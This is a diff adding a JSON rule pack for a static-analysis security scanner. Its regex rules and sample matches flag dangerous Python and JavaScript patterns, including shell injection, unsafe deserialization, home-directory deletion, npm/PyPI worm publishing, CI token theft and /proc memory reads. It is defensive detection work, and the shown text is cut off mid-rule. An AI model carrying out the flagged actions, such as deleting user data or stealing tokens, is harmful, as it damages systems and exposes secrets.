@@ -1,0 +1,2951 @@
+{
+  "schema_version": "1.0",
+  "generated": "2026-06-10",
+  "pack": "sast",
+  "pack_version": 1,
+  "rules": [
+    {
+      "id": "SA-PY-001",
+      "type": "regex",
+      "pattern": "\\beval\\s*\\(",
+      "extensions": [
+        ".py"
+      ],
+      "title": "Dangerous Eval",
+      "severity": "high",
+      "confidence": 0.7,
+      "category": "code-execution",
+      "explanation": "Dangerous Eval (code-execution) detected in a .py file.",
+      "examples": {
+        "match": [
+          "eval(user_input)",
+          "result = eval('1+1')",
+          "eval ( x )"
+        ],
+        "no_match": [
+          "evaluate(x)",
+          "# eval is risky"
+        ]
+      }
+    },
+    {
+      "id": "SA-PY-002",
+      "type": "regex",
+      "pattern": "\\bexec\\s*\\(",
+      "extensions": [
+        ".py"
+      ],
+      "title": "Dangerous Exec",
+      "severity": "high",
+      "confidence": 0.7,
+      "category": "code-execution",
+      "explanation": "Dangerous Exec (code-execution) detected in a .py file.",
+      "examples": {
+        "match": [
+          "exec(code)",
+          "exec ('print(1)')",
+          "exec(compiled)"
+        ],
+        "no_match": [
+          "execute_query(x)",
+          "# exec note"
+        ]
+      }
+    },
+    {
+      "id": "SA-PY-003",
+      "type": "regex",
+      "pattern": "\\b__import__\\s*\\(",
+      "extensions": [
+        ".py"
+      ],
+      "title": "Dynamic Import",
+      "severity": "high",
+      "confidence": 0.7,
+      "category": "code-execution",
+      "explanation": "Dynamic Import (code-execution) detected in a .py file.",
+      "examples": {
+        "match": [
+          "__import__('os')",
+          "m = __import__ (name)",
+          "__import__('subprocess')"
+        ],
+        "no_match": [
+          "import os",
+          "from x import y"
+        ]
+      }
+    },
+    {
+      "id": "SA-PY-004",
+      "type": "regex",
+      "pattern": "\\bcompile\\s*\\([^)]*[\\'\"]exec[\\'\"]",
+      "extensions": [
+        ".py"
+      ],
+      "title": "Dynamic Compile",
+      "severity": "medium",
+      "confidence": 0.7,
+      "category": "code-execution",
+      "explanation": "Dynamic Compile (code-execution) detected in a .py file.",
+      "examples": {
+        "match": [
+          "compile(src, '<s>', 'exec')",
+          "compile(code,'f','exec')",
+          "c = compile( x , 'm' , 'exec' )"
+        ],
+        "no_match": [
+          "compile(src, '<s>', 'eval')",
+          "re.compile(pattern)"
+        ]
+      }
+    },
+    {
+      "id": "SA-PY-005",
+      "type": "regex",
+      "pattern": "\\b(pickle|cPickle|shelve|yaml)\\.(loads?|load_all|unsafe_load)\\s*\\(",
+      "extensions": [
+        ".py"
+      ],
+      "title": "Unsafe Deserialization",
+      "severity": "critical",
+      "confidence": 0.85,
+      "category": "deserialization",
+      "explanation": "Unsafe Deserialization (deserialization) detected in a .py file.",
+      "examples": {
+        "match": [
+          "pickle.loads(data)",
+          "yaml.load(stream)",
+          "cPickle.load(f)"
+        ],
+        "no_match": [
+          "pickle.dumps(obj)",
+          "yaml.safe_load(s)"
+        ]
+      }
+    },
+    {
+      "id": "SA-PY-006",
+      "type": "regex",
+      "pattern": "\\bsubprocess\\.(call|run|Popen|check_output|check_call)\\s*\\([^)]*shell\\s*=\\s*True",
+      "extensions": [
+        ".py"
+      ],
+      "title": "Shell Injection (subprocess)",
+      "severity": "critical",
+      "confidence": 0.8,
+      "category": "shell-injection",
+      "explanation": "Shell Injection (subprocess) (shell-injection) detected in a .py file.",
+      "examples": {
+        "match": [
+          "subprocess.run(cmd, shell=True)",
+          "subprocess.Popen(c, shell = True)",
+          "subprocess.call('ls', shell=True)"
+        ],
+        "no_match": [
+          "subprocess.run(cmd)",
+          "subprocess.run(cmd, shell=False)"
+        ]
+      }
+    },
+    {
+      "id": "SA-PY-007",
+      "type": "regex",
+      "pattern": "\\bos\\.(popen|system)\\s*\\(",
+      "extensions": [
+        ".py"
+      ],
+      "title": "Shell Injection (os)",
+      "severity": "critical",
+      "confidence": 0.8,
+      "category": "shell-injection",
+      "explanation": "Shell Injection (os) (shell-injection) detected in a .py file.",
+      "examples": {
+        "match": [
+          "os.system('ls')",
+          "os.popen(cmd)",
+          "os.system ( x )"
+        ],
+        "no_match": [
+          "os.path.join(a,b)",
+          "os.listdir('.')"
+        ]
+      }
+    },
+    {
+      "id": "SA-PY-008",
+      "type": "regex",
+      "pattern": "(?i)(execute|cursor\\.execute)\\s*\\([^)]*(%s|%d|\\+|\\.format|f[\\'\"])",
+      "extensions": [
+        ".py"
+      ],
+      "title": "SQL Injection Pattern",
+      "severity": "high",
+      "confidence": 0.7,
+      "category": "injection",
+      "explanation": "SQL Injection Pattern (injection) detected in a .py file.",
+      "examples": {
+        "match": [
+          "cursor.execute('SELECT * FROM t WHERE id=%s' % i)",
+          "execute('q' + var)",
+          "cursor.execute(f'select {x}')"
+        ],
+        "no_match": [
+          "cursor.execute('SELECT 1')",
+          "logger.info('done')"
+        ]
+      },
+      "flags": [
+        "IGNORECASE"
+      ]
+    },
+    {
+      "id": "SA-PY-009",
+      "type": "regex",
+      "pattern": "[\\'\\\"]\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}[\\'\"]",
+      "extensions": [
+        ".py"
+      ],
+      "title": "Hardcoded IP",
+      "severity": "low",
+      "confidence": 0.3,
+      "category": "hardcoded",
+      "explanation": "Hardcoded IP (hardcoded) detected in a .py file.",
+      "examples": {
+        "match": [
+          "host = '10.0.0.1'",
+          "ip='192.168.0.1'",
+          "addr = \"172.16.0.1\""
+        ],
+        "no_match": [
+          "version = '1.2.3'",
+          "host = 'example.com'"
+        ]
+      }
+    },
+    {
+      "id": "SA-PY-010",
+      "type": "regex",
+      "pattern": "from_pretrained\\s*\\(\\s*[\\'\"][a-zA-Z0-9_-]+/[a-zA-Z0-9_.-]+[\\'\"]",
+      "extensions": [
+        ".py"
+      ],
+      "title": "Model Confusion: Bare from_pretrained Path",
+      "severity": "high",
+      "confidence": 0.85,
+      "category": "model-confusion",
+      "explanation": "Model Confusion: Bare from_pretrained Path (model-confusion) detected in a .py file.",
+      "examples": {
+        "match": [
+          "model.from_pretrained('org/model')",
+          "from_pretrained('user/repo-v1')",
+          "from_pretrained( 'a/b.c' )"
+        ],
+        "no_match": [
+          "from_pretrained('/local/path')",
+          "from_pretrained(model_dir)"
+        ]
+      }
+    },
+    {
+      "id": "SA-PY-011",
+      "type": "regex",
+      "pattern": "trust_remote_code\\s*=\\s*True",
+      "extensions": [
+        ".py"
+      ],
+      "title": "Model Confusion: trust_remote_code=True",
+      "severity": "critical",
+      "confidence": 0.85,
+      "category": "model-confusion",
+      "explanation": "Model Confusion: trust_remote_code=True (model-confusion) detected in a .py file.",
+      "examples": {
+        "match": [
+          "from_pretrained('x', trust_remote_code=True)",
+          "trust_remote_code = True",
+          "trust_remote_code=True"
+        ],
+        "no_match": [
+          "trust_remote_code=False",
+          "# trust_remote_code note"
+        ]
+      }
+    },
+    {
+      "id": "SA-PY-012",
+      "type": "regex",
+      "pattern": "torch\\.load\\s*\\([^)]*weights_only\\s*=\\s*False",
+      "extensions": [
+        ".py"
+      ],
+      "title": "Unsafe Model Load: torch.load weights_only=False",
+      "severity": "critical",
+      "confidence": 0.85,
+      "category": "model-confusion",
+      "explanation": "Unsafe Model Load: torch.load weights_only=False (model-confusion) detected in a .py file.",
+      "examples": {
+        "match": [
+          "torch.load(f, weights_only=False)",
+          "torch.load(path, weights_only = False)",
+          "torch.load('m.pt', weights_only=False)"
+        ],
+        "no_match": [
+          "torch.load(f, weights_only=True)",
+          "torch.save(m, f)"
+        ]
+      }
+    },
+    {
+      "id": "SA-PY-013",
+      "type": "regex",
+      "pattern": "torch\\.load\\s*\\((?![^)]*\\bweights_only\\b)",
+      "extensions": [
+        ".py"
+      ],
+      "title": "Unsafe Pickle Model Load",
+      "severity": "high",
+      "confidence": 0.85,
+      "category": "model-confusion",
+      "explanation": "Unsafe Pickle Model Load (model-confusion) detected in a .py file.",
+      "examples": {
+        "match": [
+          "torch.load('model.pt')",
+          "m = torch.load(path)",
+          "torch.load( f )"
+        ],
+        "no_match": [
+          "torch.load(f, weights_only=True)",
+          "torch.save(m, f)"
+        ]
+      }
+    },
+    {
+      "id": "SA-PY-014",
+      "type": "regex",
+      "pattern": "shutil\\.rmtree\\s*\\(\\s*(?:os\\.path\\.expanduser\\([^)]*~|os\\.environ[^)]*HOME)",
+      "extensions": [
+        ".py"
+      ],
+      "title": "Destructive: shutil.rmtree on Home",
+      "severity": "critical",
+      "confidence": 0.9,
+      "category": "destructive-command",
+      "explanation": "Destructive: shutil.rmtree on Home (destructive-command) detected in a .py file.",
+      "examples": {
+        "match": [
+          "shutil.rmtree(os.path.expanduser('~/x'))",
+          "shutil.rmtree(os.environ['HOME'])",
+          "shutil.rmtree( os.path.expanduser( '~' ) )"
+        ],
+        "no_match": [
+          "shutil.rmtree('/tmp/build')",
+          "shutil.copy(a, b)"
+        ]
+      }
+    },
+    {
+      "id": "SA-PY-015",
+      "type": "regex",
+      "pattern": "twine\\s+upload|subprocess.*twine.*upload|setup\\.py\\s+sdist\\s+upload",
+      "extensions": [
+        ".py"
+      ],
+      "title": "PyPI Worm: Programmatic Publish",
+      "severity": "critical",
+      "confidence": 0.85,
+      "category": "worm-propagation",
+      "explanation": "PyPI Worm: Programmatic Publish (worm-propagation) detected in a .py file.",
+      "examples": {
+        "match": [
+          "twine upload dist/*",
+          "subprocess.run('twine upload x')",
+          "setup.py sdist upload"
+        ],
+        "no_match": [
+          "pip install twine",
+          "# upload docs"
+        ]
+      }
+    },
+    {
+      "id": "SA-PY-016",
+      "type": "regex",
+      "pattern": "(?:socket\\.)?socket\\s*\\(\\s*(?:38|0x26|(?:socket\\.)?AF_ALG)\\s*[\\s,)]",
+      "extensions": [
+        ".py"
+      ],
+      "title": "Kernel Exploit: AF_ALG Socket",
+      "severity": "critical",
+      "confidence": 0.8,
+      "category": "kernel-exploit",
+      "explanation": "Kernel Exploit: AF_ALG Socket (kernel-exploit) detected in a .py file.",
+      "examples": {
+        "match": [
+          "socket.socket(socket.AF_ALG, 0)",
+          "socket(38, 0)",
+          "s = socket.socket( AF_ALG )"
+        ],
+        "no_match": [
+          "socket.socket(socket.AF_INET)",
+          "# AF_ALG mention"
+        ]
+      }
+    },
+    {
+      "id": "SA-PY-017",
+      "type": "regex",
+      "pattern": "\\.bind\\s*\\(\\s*\\(\\s*[\\'\"](?:aead|skcipher)[\\'\"]",
+      "extensions": [
+        ".py"
+      ],
+      "title": "Kernel Exploit: Crypto Template Bind",
+      "severity": "critical",
+      "confidence": 0.8,
+      "category": "kernel-exploit",
+      "explanation": "Kernel Exploit: Crypto Template Bind (kernel-exploit) detected in a .py file.",
+      "examples": {
+        "match": [
+          "s.bind(('aead', 'x'))",
+          ".bind( ('skcipher', 'y') )",
+          "sock.bind(('aead','gcm'))"
+        ],
+        "no_match": [
+          ".bind(('127.0.0.1', 80))",
+          "bind mount"
+        ]
+      }
+    },
+    {
+      "id": "SA-PY-018",
+      "type": "regex",
+      "pattern": "\\bauthencesn\\b",
+      "extensions": [
+        ".py"
+      ],
+      "title": "Kernel Exploit: authencesn Reference",
+      "severity": "high",
+      "confidence": 0.8,
+      "category": "kernel-exploit",
+      "explanation": "Kernel Exploit: authencesn Reference (kernel-exploit) detected in a .py file.",
+      "examples": {
+        "match": [
+          "alg = 'authencesn'",
+          "use authencesn here",
+          "x authencesn y"
+        ],
+        "no_match": [
+          "authentication",
+          "auth_token"
+        ]
+      }
+    },
+    {
+      "id": "SA-PY-019",
+      "type": "regex",
+      "pattern": "getattr\\s*\\(\\s*__import__\\s*\\(",
+      "extensions": [
+        ".py"
+      ],
+      "title": "Reflection RCE: getattr + __import__ combo",
+      "severity": "high",
+      "confidence": 0.65,
+      "category": "reflection-rce",
+      "explanation": "Reflection RCE: getattr + __import__ combo (reflection-rce) detected in a .py file.",
+      "examples": {
+        "match": [
+          "getattr(__import__('os'), 'system')",
+          "getattr( __import__('subprocess'), 'run')",
+          "f = getattr(__import__('m'), 'x')"
+        ],
+        "no_match": [
+          "getattr(obj, 'attr')",
+          "__import__('os')"
+        ]
+      }
+    },
+    {
+      "id": "SA-PY-020",
+      "type": "regex",
+      "pattern": "/proc/\\d+/mem|/proc/self/mem",
+      "extensions": [
+        ".py"
+      ],
+      "title": "Process Memory Read (/proc)",
+      "severity": "critical",
+      "confidence": 0.9,
+      "category": "memory-forensics",
+      "explanation": "Process Memory Read (/proc) (memory-forensics) detected in a .py file.",
+      "examples": {
+        "match": [
+          "open('/proc/1234/mem')",
+          "/proc/self/mem",
+          "read('/proc/999/mem')"
+        ],
+        "no_match": [
+          "/proc/cpuinfo",
+          "/process/mem"
+        ]
+      }
+    },
+    {
+      "id": "SA-PY-021",
+      "type": "regex",
+      "pattern": "os\\.listdir\\s*\\(\\s*[\"\\']/?proc[\"\\']|glob\\.glob\\s*\\(\\s*[\"\\']/?proc/\\d|/proc/\\*/cmdline",
+      "extensions": [
+        ".py"
+      ],
+      "title": "Process Enumeration (/proc)",
+      "severity": "high",
+      "confidence": 0.7,
+      "category": "process-enumeration",
+      "explanation": "Process Enumeration (/proc) (process-enumeration) detected in a .py file.",
+      "examples": {
+        "match": [
+          "os.listdir('/proc')",
+          "glob.glob('/proc/1')",
+          "/proc/*/cmdline"
+        ],
+        "no_match": [
+          "os.listdir('/tmp')",
+          "glob.glob('*.py')"
+        ]
+      }
+    },
+    {
+      "id": "SA-PY-022",
+      "type": "regex",
+      "pattern": "\\bRunner\\.Worker\\b|\\bRunner\\.Listener\\b",
+      "extensions": [
+        ".py"
+      ],
+      "title": "Runner.Worker Process Hunt",
+      "severity": "critical",
+      "confidence": 0.7,
+      "category": "process-enumeration",
+      "explanation": "Runner.Worker Process Hunt (process-enumeration) detected in a .py file.",
+      "examples": {
+        "match": [
+          "kill Runner.Worker",
+          "find Runner.Listener",
+          "runner.worker scan"
+        ],
+        "no_match": [
+          "RunnerWorker class",
+          "worker.run()"
+        ]
+      },
+      "flags": [
+        "IGNORECASE"
+      ]
+    },
+    {
+      "id": "SA-PY-023",
+      "type": "regex",
+      "pattern": "ACTIONS_ID_TOKEN_REQUEST_TOKEN|ACTIONS_ID_TOKEN_REQUEST_URL|oidc/token/exchange",
+      "extensions": [
+        ".py"
+      ],
+      "title": "OIDC Token Exchange",
+      "severity": "critical",
+      "confidence": 0.85,
+      "category": "ci-token-abuse",
+      "explanation": "OIDC Token Exchange (ci-token-abuse) detected in a .py file.",
+      "examples": {
+        "match": [
+          "ACTIONS_ID_TOKEN_REQUEST_TOKEN",
+          "ACTIONS_ID_TOKEN_REQUEST_URL",
+          "oidc/token/exchange"
+        ],
+        "no_match": [
+          "ID_TOKEN_REQUEST",
+          "token exchange docs"
+        ]
+      }
+    },
+    {
+      "id": "SA-JS-001",
+      "type": "regex",
+      "pattern": "\\beval\\s*\\(",
+      "extensions": [
+        ".js"
+      ],
+      "title": "Dangerous Eval",
+      "severity": "high",
+      "confidence": 0.7,
+      "category": "code-execution",
+      "explanation": "Dangerous Eval (code-execution) detected in a .js file.",
+      "examples": {
+        "match": [
+          "eval(userInput)",
+          "eval('1+1')",
+          "eval ( x )"
+        ],
+        "no_match": [
+          "evaluate(x)",
+          "// eval note"
+        ]
+      }
+    },
+    {
+      "id": "SA-JS-002",
+      "type": "regex",
+      "pattern": "\\bnew\\s+Function\\s*\\(",
+      "extensions": [
+        ".js"
+      ],
+      "title": "Function Constructor",
+      "severity": "high",
+      "confidence": 0.7,
+      "category": "code-execution",
+      "explanation": "Function Constructor (code-execution) detected in a .js file.",
+      "examples": {
+        "match": [
+          "new Function('return 1')",
+          "new  Function(args)",
+          "const f = new Function ( x )"
+        ],
+        "no_match": [
+          "function foo(){}",
+          "Function.prototype"
+        ]
+      }
+    },
+    {
+      "id": "SA-JS-003",
+      "type": "regex",
+      "pattern": "dangerouslySetInnerHTML",
+      "extensions": [
+        ".js"
+      ],
+      "title": "Unsafe HTML",
+      "severity": "high",
+      "confidence": 0.65,
+      "category": "xss",
+      "explanation": "Unsafe HTML (xss) detected in a .js file.",
+      "examples": {
+        "match": [
+          "dangerouslySetInnerHTML={{__html:x}}",
+          "el.dangerouslySetInnerHTML",
+          "<div dangerouslySetInnerHTML />"
+        ],
+        "no_match": [
+          "setInnerHtml(x)",
+          "innerHTML safe note"
+        ]
+      }
+    },
+    {
+      "id": "SA-JS-004",
+      "type": "regex",
+      "pattern": "\\.innerHTML\\s*=",
+      "extensions": [
+        ".js"
+      ],
+      "title": "innerHTML Assignment",
+      "severity": "medium",
+      "confidence": 0.65,
+      "category": "xss",
+      "explanation": "innerHTML Assignment (xss) detected in a .js file.",
+      "examples": {
+        "match": [
+          "el.innerHTML = x",
+          "div.innerHTML='<b>'",
+          "node.innerHTML =data"
+        ],
+        "no_match": [
+          "el.innerText = x",
+          "innerHTML check"
+        ]
+      }
+    },
+    {
+      "id": "SA-JS-005",
+      "type": "regex",
+      "pattern": "(require\\s*\\(\\s*[\\'\"]child_process[\\'\"]\\s*\\)|child_process)\\.(exec|execSync|spawn)\\s*\\(",
+      "extensions": [
+        ".js"
+      ],
+      "title": "Child Process Exec",
+      "severity": "critical",
+      "confidence": 0.8,
+      "category": "shell-injection",
+      "explanation": "Child Process Exec (shell-injection) detected in a .js file.",
+      "examples": {
+        "match": [
+          "require('child_process').exec(cmd)",
+          "child_process.spawn('ls')",
+          "child_process.execSync(c)"
+        ],
+        "no_match": [
+          "import fs from 'fs'",
+          "childProcessHelper()"
+        ]
+      }
+    },
+    {
+      "id": "SA-JS-006",
+      "type": "regex",
+      "pattern": "setTimeout\\s*\\(\\s*[\\'\"][^\\'\"]+[\\'\"]",
+      "extensions": [
+        ".js"
+      ],
+      "title": "Implied Eval (setTimeout)",
+      "severity": "medium",
+      "confidence": 0.7,
+      "category": "code-execution",
+      "explanation": "Implied Eval (setTimeout) (code-execution) detected in a .js file.",
+      "examples": {
+        "match": [
+          "setTimeout('alert(1)', 100)",
+          "setTimeout(\"x()\", 0)",
+          "setTimeout( 'y' , 5)"
+        ],
+        "no_match": [
+          "setTimeout(fn, 100)",
+          "setTimeout(() => x(), 0)"
+        ]
+      }
+    },
+    {
+      "id": "SA-JS-007",
+      "type": "regex",
+      "pattern": "document\\.write\\s*\\(",
+      "extensions": [
+        ".js"
+      ],
+      "title": "document.write",
+      "severity": "medium",
+      "confidence": 0.65,
+      "category": "xss",
+      "explanation": "document.write (xss) detected in a .js file.",
+      "examples": {
+        "match": [
+          "document.write(x)",
+          "document.write('<b>')",
+          "document.write ( y )"
+        ],
+        "no_match": [
+          "document.writeln helper note",
+          "documentWrite(x)"
+        ]
+      }
+    },
+    {
+      "id": "SA-JS-008",
+      "type": "regex",
+      "pattern": "(?i)(SELECT|INSERT|UPDATE|DELETE)\\s+.*\\+\\s*(?:req\\.|params\\.|query\\.)",
+      "extensions": [
+        ".js"
+      ],
+      "title": "SQL String Concat",
+      "severity": "high",
+      "confidence": 0.7,
+      "category": "injection",
+      "explanation": "SQL String Concat (injection) detected in a .js file.",
+      "examples": {
+        "match": [
+          "SELECT * FROM t WHERE id=' + req.params.id",
+          "INSERT INTO x ' + query.v",
+          "DELETE FROM t' + req.body"
+        ],
+        "no_match": [
+          "SELECT * FROM t WHERE id=?",
+          "const q = 'SELECT 1'"
+        ]
+      },
+      "flags": [
+        "IGNORECASE"
+      ]
+    },
+    {
+      "id": "SA-JS-009",
+      "type": "regex",
+      "pattern": "console\\.(log|error|warn|debug|info)\\s*\\([^)]*process\\.env\\s*[,)]",
+      "extensions": [
+        ".js"
+      ],
+      "title": "process.env Logged to Console",
+      "severity": "high",
+      "confidence": 0.8,
+      "category": "secret-exposure",
+      "explanation": "process.env Logged to Console (secret-exposure) detected in a .js file.",
+      "examples": {
+        "match": [
+          "console.log(process.env)",
+          "console.error('e', process.env)",
+          "console.warn(process.env,1)"
+        ],
+        "no_match": [
+          "console.log('hello')",
+          "process.env.PORT"
+        ]
+      }
+    },
+    {
+      "id": "SA-JS-010",
+      "type": "regex",
+      "pattern": "JSON\\.stringify\\s*\\(\\s*process\\.env\\s*[,)]",
+      "extensions": [
+        ".js"
+      ],
+      "title": "process.env Serialized (JSON.stringify)",
+      "severity": "high",
+      "confidence": 0.8,
+      "category": "secret-exposure",
+      "explanation": "process.env Serialized (JSON.stringify) (secret-exposure) detected in a .js file.",
+      "examples": {
+        "match": [
+          "JSON.stringify(process.env)",
+          "JSON.stringify( process.env )",
+          "JSON.stringify(process.env,null,2)"
+        ],
+        "no_match": [
+          "JSON.stringify(data)",
+          "JSON.parse(x)"
+        ]
+      }
+    },
+    {
+      "id": "SA-JS-011",
+      "type": "regex",
+      "pattern": "(?:writeFile|writeFileSync|appendFile)\\s*\\([^)]*process\\.env",
+      "extensions": [
+        ".js"
+      ],
+      "title": "process.env in Crash Report",
+      "severity": "high",
+      "confidence": 0.8,
+      "category": "secret-exposure",
+      "explanation": "process.env in Crash Report (secret-exposure) detected in a .js file.",
+      "examples": {
+        "match": [
+          "writeFile('c.log', process.env)",
+          "fs.writeFileSync(p, process.env)",
+          "appendFile(f, process.env.X)"
+        ],
+        "no_match": [
+          "writeFile('c.log', data)",
+          "readFile(p)"
+        ]
+      }
+    },
+    {
+      "id": "SA-JS-012",
+      "type": "regex",
+      "pattern": "(?:sendFile|readFile|readFileSync|createReadStream)\\s*\\([^)]*(?:req\\.path|req\\.params|req\\.query|req\\.url)",
+      "extensions": [
+        ".js"
+      ],
+      "title": "Path Traversal: Unsanitized File Serve",
+      "severity": "high",
+      "confidence": 0.75,
+      "category": "path-traversal",
+      "explanation": "Path Traversal: Unsanitized File Serve (path-traversal) detected in a .js file.",
+      "examples": {
+        "match": [
+          "sendFile(req.path)",
+          "readFileSync(req.params.name)",
+          "createReadStream(req.query.f)"
+        ],
+        "no_match": [
+          "sendFile('/static/x')",
+          "readFile(safePath)"
+        ]
+      }
+    },
+    {
+      "id": "SA-JS-013",
+      "type": "regex",
+      "pattern": "path\\.(?:join|resolve)\\s*\\([^)]*(?:req\\.path|req\\.params|req\\.query|req\\.url)",
+      "extensions": [
+        ".js"
+      ],
+      "title": "Path Traversal: Unsanitized path.join",
+      "severity": "high",
+      "confidence": 0.75,
+      "category": "path-traversal",
+      "explanation": "Path Traversal: Unsanitized path.join (path-traversal) detected in a .js file.",
+      "examples": {
+        "match": [
+          "path.join(base, req.path)",
+          "path.resolve(req.params.p)",
+          "path.join(dir, req.query.f)"
+        ],
+        "no_match": [
+          "path.join(base, 'static')",
+          "path.resolve(__dirname)"
+        ]
+      }
+    },
+    {
+      "id": "SA-JS-014",
+      "type": "regex",
+      "pattern": "['\"]/proc/self/environ['\"]",
+      "extensions": [
+        ".js"
+      ],
+      "title": "Direct /proc Filesystem Access",
+      "severity": "high",
+      "confidence": 0.75,
+      "category": "path-traversal",
+      "explanation": "Direct /proc Filesystem Access (path-traversal) detected in a .js file.",
+      "examples": {
+        "match": [
+          "read(\"/proc/self/environ\")",
+          "open('/proc/self/environ')",
+          "x = \"/proc/self/environ\""
+        ],
+        "no_match": [
+          "/proc/cpuinfo",
+          "/procedures/list"
+        ]
+      }
+    },
+    {
+      "id": "SA-JS-015",
+      "type": "regex",
+      "pattern": "npm\\s+access\\s+ls-packages|npm\\s+whoami|registry\\.npmjs\\.org.*/-/v1/search",
+      "extensions": [
+        ".js"
+      ],
+      "title": "NPM Worm: Package Enumeration",
+      "severity": "critical",
+      "confidence": 0.85,
+      "category": "worm-propagation",
+      "explanation": "NPM Worm: Package Enumeration (worm-propagation) detected in a .js file.",
+      "examples": {
+        "match": [
+          "npm access ls-packages",
+          "npm whoami",
+          "registry.npmjs.org/-/v1/search"
+        ],
+        "no_match": [
+          "npm install x",
+          "npm run build"
+        ]
+      }
+    },
+    {
+      "id": "SA-JS-016",
+      "type": "regex",
+      "pattern": "npm\\s+publish|child_process.*npm.*publish|exec.*npm\\s+publish",
+      "extensions": [
+        ".js"
+      ],
+      "title": "NPM Worm: Programmatic Publish",
+      "severity": "critical",
+      "confidence": 0.85,
+      "category": "worm-propagation",
+      "explanation": "NPM Worm: Programmatic Publish (worm-propagation) detected in a .js file.",
+      "examples": {
+        "match": [
+          "npm publish",
+          "child_process.exec('npm publish')",
+          "exec npm publish --tag"
+        ],
+        "no_match": [
+          "npm install",
+          "npm version patch"
+        ]
+      }
+    },
+    {
+      "id": "SA-JS-017",
+      "type": "regex",
+      "pattern": "\\.npmrc|NPM_TOKEN|npm_token|npm-token",
+      "extensions": [
+        ".js"
+      ],
+      "title": "NPM Token Theft",
+      "severity": "critical",
+      "confidence": 0.8,
+      "category": "credential-theft",
+      "explanation": "NPM Token Theft (credential-theft) detected in a .js file.",
+      "examples": {
+        "match": [
+          ".npmrc",
+          "NPM_TOKEN=x",
+          "npm-token leak"
+        ],
+        "no_match": [
+          "package.json",
+          "npm registry"
+        ]
+      }
+    },
+    {
+      "id": "SA-JS-018",
+      "type": "regex",
+      "pattern": "POST\\s+/user/repos|repos\\.create|createForAuthenticatedUser|user/repos",
+      "extensions": [
+        ".js"
+      ],
+      "title": "Git-Based Exfiltration: Repo Creation",
+      "severity": "critical",
+      "confidence": 0.85,
+      "category": "git-exfiltration",
+      "explanation": "Git-Based Exfiltration: Repo Creation (git-exfiltration) detected in a .js file.",
+      "examples": {
+        "match": [
+          "POST /user/repos",
+          "octokit.repos.create({})",
+          "createForAuthenticatedUser()"
+        ],
+        "no_match": [
+          "GET /user",
+          "repos.list()"
+        ]
+      }
+    },
+    {
+      "id": "SA-JS-019",
+      "type": "regex",
+      "pattern": "PUT\\s+/repos/.*/contents/|repos\\.createOrUpdateFileContents|createOrUpdateFile",
+      "extensions": [
+        ".js"
+      ],
+      "title": "Git-Based Exfiltration: Content Push",
+      "severity": "high",
+      "confidence": 0.85,
+      "category": "git-exfiltration",
+      "explanation": "Git-Based Exfiltration: Content Push (git-exfiltration) detected in a .js file.",
+      "examples": {
+        "match": [
+          "PUT /repos/o/r/contents/f",
+          "repos.createOrUpdateFileContents()",
+          "createOrUpdateFile(x)"
+        ],
+        "no_match": [
+          "GET /repos/o/r",
+          "repos.get()"
+        ]
+      }
+    },
+    {
+      "id": "SA-JS-020",
+      "type": "regex",
+      "pattern": "/search/commits\\?q=|search\\.commits|commits\\?q=",
+      "extensions": [
+        ".js"
+      ],
+      "title": "Git-Based Exfiltration: Commit Search C2",
+      "severity": "critical",
+      "confidence": 0.85,
+      "category": "git-exfiltration",
+      "explanation": "Git-Based Exfiltration: Commit Search C2 (git-exfiltration) detected in a .js file.",
+      "examples": {
+        "match": [
+          "/search/commits?q=token",
+          "search.commits({})",
+          "commits?q=secret"
+        ],
+        "no_match": [
+          "/search/code?q=x",
+          "commit message"
+        ]
+      }
+    },
+    {
+      "id": "SA-JS-021",
+      "type": "regex",
+      "pattern": "ACTIONS_ID_TOKEN_REQUEST_TOKEN|ACTIONS_ID_TOKEN_REQUEST_URL|oidc/token/exchange",
+      "extensions": [
+        ".js"
+      ],
+      "title": "OIDC Token Exchange",
+      "severity": "critical",
+      "confidence": 0.85,
+      "category": "ci-token-abuse",
+      "explanation": "OIDC Token Exchange (ci-token-abuse) detected in a .js file.",
+      "examples": {
+        "match": [
+          "ACTIONS_ID_TOKEN_REQUEST_TOKEN",
+          "ACTIONS_ID_TOKEN_REQUEST_URL",
+          "oidc/token/exchange"
+        ],
+        "no_match": [
+          "ID_TOKEN_REQUEST",
+          "token docs"
+        ]
+      }
+    },
+    {
+      "id": "SA-JS-022",
+      "type": "regex",
+      "pattern": "/proc/\\d+/mem|/proc/self/mem",
+      "extensions": [
+        ".js"
+      ],
+      "title": "Process Memory Read (/proc)",
+      "severity": "critical",
+      "confidence": 0.9,
+      "category": "memory-forensics",
+      "explanation": "Process Memory Read (/proc) (memory-forensics) detected in a .js file.",
+      "examples": {
+        "match": [
+          "open('/proc/1234/mem')",
+          "/proc/self/mem",
+          "'/proc/999/mem'"
+        ],
+        "no_match": [
+          "/proc/cpuinfo",
+          "/process/mem"
+        ]
+      }
+    },
+    {
+      "id": "SA-JS-023",
+      "type": "regex",
+      "pattern": "readdir\\w*\\s*\\(\\s*[\"\\']/?proc[\"\\']|/proc/\\*/cmdline",
+      "extensions": [
+        ".js"
+      ],
+      "title": "Process Enumeration (/proc)",
+      "severity": "high",
+      "confidence": 0.7,
+      "category": "process-enumeration",
+      "explanation": "Process Enumeration (/proc) (process-enumeration) detected in a .js file.",
+      "examples": {
+        "match": [
+          "readdirSync('/proc')",
+          "readdir('/proc')",
+          "/proc/*/cmdline"
+        ],
+        "no_match": [
+          "readdir('/tmp')",
+          "readDirectory()"
+        ]
+      }
+    },
+    {
+      "id": "SA-JS-024",
+      "type": "regex",
+      "pattern": "\\bRunner\\.Worker\\b|\\bRunner\\.Listener\\b",
+      "extensions": [
+        ".js"
+      ],
+      "title": "Runner.Worker Process Hunt",
+      "severity": "critical",
+      "confidence": 0.7,
+      "category": "process-enumeration",
+      "explanation": "Runner.Worker Process Hunt (process-enumeration) detected in a .js file.",
+      "examples": {
+        "match": [
+          "kill Runner.Worker",
+          "Runner.Listener find",
+          "runner.worker"
+        ],
+        "no_match": [
+          "RunnerWorker",
+          "worker run"
+        ]
+      },
+      "flags": [
+        "IGNORECASE"
+      ]
+    },
+    {
+      "id": "SA-JS-025",
+      "type": "regex",
+      "pattern": "base64\\s+-w\\s*0\\s*\\|\\s*base64|btoa\\(btoa\\(|b64encode\\(.*b64encode\\(",
+      "extensions": [
+        ".js"
+      ],
+      "title": "Double Base64 Encoding",
+      "severity": "high",
+      "confidence": 0.7,
+      "category": "obfuscation",
+      "explanation": "Double Base64 Encoding (obfuscation) detected in a .js file.",
+      "examples": {
+        "match": [
+          "base64 -w 0 | base64",
+          "btoa(btoa(x))",
+          "b64encode(b64encode(d))"
+        ],
